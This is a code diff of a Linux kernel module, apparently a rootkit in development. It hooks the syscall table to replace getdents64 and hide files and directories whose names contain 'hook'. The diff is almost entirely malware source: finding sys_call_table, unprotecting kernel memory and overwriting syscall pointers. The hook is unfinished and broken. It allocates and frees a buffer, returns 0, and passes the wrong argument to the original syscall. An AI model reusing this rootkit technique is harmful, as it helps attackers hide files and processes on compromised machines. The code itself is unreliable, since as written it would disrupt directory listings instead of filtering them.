@@ -3,26 +3,39 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
+#include <linux/dirent.h>
+#include <linux/slab.h>
 
 #include "my_memory.h"
 
+#define IGNORE_TEXT "hook"                      //<- Text on file/dir to hide. If a file contains this text, hides it
 
-static unsigned long *__sys_call_table;                          //<- Pointer to the Kernel syscall table
+static unsigned long *__sys_call_table;                         //<- Pointer to the Kernel syscall table
 
-asmlinkage int (*original_kill) (const struct pt_regs *regs);
+asmlinkage long (*original_getdents64) (const struct pt_regs *regs);
 
-/*
- For regs, params are:
- - si: Signal
- - di: Process_id
-*/
-asmlinkage int hooked_kill(const struct pt_regs *regs)
+
+asmlinkage int hooked_getdents64(const struct pt_regs *regs)
 {
-        pr_info("   Hooked Syscall!!\n");
+        struct linux_dirent64 __user * direntry;      //<- Pointer to real direntry
+        struct linux_dirent64 * direntry_final;       //<- Pointer to direntries without the ones to hide
+        long n_size;                                  //<- Total size for all direntries
 
-        pr_info("   Signal %d for process %d.\n", (int) regs->si, (int) regs->di);
+        pr_info("   Syscall hooked.\n");
 
-        //return original_kill(regs);
+        direntry = (struct linux_dirent64 *) regs->si; //<- @ referenced in RSI register
+
+        n_size = original_getdents64(direntry);        //<- Call the original getdents64 syscall
+                                                       //   With this we get all the dir entries   
+
+        direntry_final = (struct linux_dirent64 *) kzalloc(n_size, GFP_KERNEL);  //<- Reserve space for direntries without the
+                                                                                 //   ones to hide
+
+
+
+
+        kfree(direntry_final);                          //<- Free the final direntry
+
         return 0;
 }
 
@@ -33,17 +46,17 @@ static int __init lkm_init(void)
 
         __sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");     //<- Get address for Kernel Syscall Table
 
-        if (__sys_call_table == NULL) {                                         //<- Error Checking
+        if (__sys_call_table == NULL) {
                 pr_err("  Can't find syscall table!.\n");
-                return -EINTR;
+                return -1;
         }
 
-        original_kill = (void *) __sys_call_table[__NR_kill];                   //<- Save actual address for sys_shutdown
+        original_getdents64 = (void *) __sys_call_table[__NR_getdents64];       //<- Save actual address for sys_shutdown
 
-        my_memory_rw();                                                         //<- Unprotect Memory
+        my_memory_rw();         
 
-        __sys_call_table[__NR_kill] = (unsigned long) hooked_kill;              //<- Hook the Syscall Table with the
-                                                                                //   address of hooking function
+        __sys_call_table[__NR_getdents64] = (unsigned long) hooked_getdents64;   //<- Replace the syscall pointer in the syscall table
+
         my_memory_ro();
 
         return 0;
@@ -55,7 +68,7 @@ static void __exit lkm_exit(void)
 
         my_memory_rw();
 
-        __sys_call_table[__NR_kill] = (unsigned long) original_kill;             //<- Restore original Syscall
+        __sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;
 
         my_memory_ro();
 
